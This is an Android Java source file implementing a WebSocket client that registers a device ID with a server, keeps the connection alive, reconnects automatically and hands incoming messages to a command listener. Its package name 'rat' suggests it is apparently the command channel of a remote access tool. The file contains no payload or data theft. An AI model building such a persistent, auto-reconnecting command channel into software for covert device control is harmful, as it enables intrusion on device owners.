package com.vendor.rat.network;

import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.JsonObject;

import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

/**
 * WebSocket 客户端
 *
 * 功能:
 *   - 连接服务器 (wss://)
 *   - 心跳保活 (30 秒间隔)
 *   - 自动重连 (指数退避)
 *   - 接收命令并分发
 */
public class WebSocketClient extends WebSocketListener {

    private static final String TAG = "WebSocketClient";
    private static final int NORMAL_CLOSURE = 1000;

    private final String wsUrl;
    private final String deviceId;
    private final Gson gson;

    private OkHttpClient client;
    private WebSocket webSocket;
    private final AtomicBoolean connected = new AtomicBoolean(false);
    private CommandListener commandListener;

    // 重连参数
    private int reconnectAttempts = 0;
    private static final int MAX_RECONNECT_ATTEMPTS = 10;
    private static final long BASE_RECONNECT_DELAY = 3000L; // 3 秒

    public WebSocketClient(String wsUrl, String deviceId) {
        this.wsUrl = wsUrl;
        this.deviceId = deviceId;
        this.gson = new Gson();

        this.client = new OkHttpClient.Builder()
            .connectTimeout(60, TimeUnit.SECONDS)
            .readTimeout(0, TimeUnit.MILLISECONDS) // 无超时
            .pingInterval(30, TimeUnit.SECONDS)
            .build();
    }

    /**
     * 连接 WebSocket 服务器
     */
    public void connect() {
        if (connected.get()) return;
        if (wsUrl == null || wsUrl.isEmpty()) {
            Log.w(TAG, "WebSocket URL is null, skipping connect");
            return;
        }

        Request request = new Request.Builder()
            .url(wsUrl)
            .addHeader("X-Device-Id", deviceId)
            .build();

        webSocket = client.newWebSocket(request, this);
        Log.d(TAG, "Connecting to: " + wsUrl);
    }

    /**
     * 断开连接
     */
    public void disconnect() {
        if (webSocket != null) {
            webSocket.close(NORMAL_CLOSURE, "Client disconnect");
        }
        connected.set(false);
    }

    /**
     * 发送消息
     */
    public boolean send(String message) {
        if (webSocket != null && connected.get()) {
            return webSocket.send(message);
        }
        return false;
    }

    /**
     * 发送状态上报
     */
    public void sendStatus(String status) {
        JsonObject json = new JsonObject();
        json.addProperty("type", 1);
        json.addProperty("status", status);
        json.addProperty("timestamp", System.currentTimeMillis());
        send(json.toString());
    }

    /**
     * 重连
     */
    public void reconnect() {
        if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
            Log.e(TAG, "Max reconnect attempts reached");
            reconnectAttempts = 0;
            return;
        }

        long rawDelay = BASE_RECONNECT_DELAY * (long) Math.pow(2, reconnectAttempts);
        final long delay = Math.min(rawDelay, 60000L); // 最大 60 秒

        reconnectAttempts++;
        Log.d(TAG, "Reconnecting in " + delay + "ms (attempt " + reconnectAttempts + ")");

        new Thread(() -> {
            try {
                Thread.sleep(delay);
                connect();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }
        }).start();
    }

    // ============ WebSocketListener 回调 ============

    @Override
    public void onOpen(WebSocket ws, Response response) {
        connected.set(true);
        reconnectAttempts = 0;
        Log.i(TAG, "WebSocket connected");

        // 发送设备注册
        JsonObject registerMsg = new JsonObject();
        registerMsg.addProperty("type", 0); // REGISTER
        registerMsg.addProperty("deviceId", deviceId);
        ws.send(registerMsg.toString());
    }

    @Override
    public void onMessage(WebSocket ws, String text) {
        Log.d(TAG, "Received: " + text);
        if (commandListener != null) {
            commandListener.onCommandReceived(text);
        }
    }

    @Override
    public void onClosing(WebSocket ws, int code, String reason) {
        connected.set(false);
        Log.d(TAG, "WebSocket closing: " + code + " " + reason);
    }

    @Override
    public void onClosed(WebSocket ws, int code, String reason) {
        connected.set(false);
        Log.d(TAG, "WebSocket closed: " + code + " " + reason);
        if (code != NORMAL_CLOSURE) {
            reconnect();
        }
    }

    @Override
    public void onFailure(WebSocket ws, Throwable t, Response response) {
        connected.set(false);
        Log.e(TAG, "WebSocket failure", t);
        reconnect();
    }

    // ============ Getters & Setters ============

    public boolean isConnected() { return connected.get(); }

    public void setCommandListener(CommandListener listener) {
        this.commandListener = listener;
    }

    /**
     * 命令监听接口
     */
    public interface CommandListener {
        void onCommandReceived(String message);
    }
}
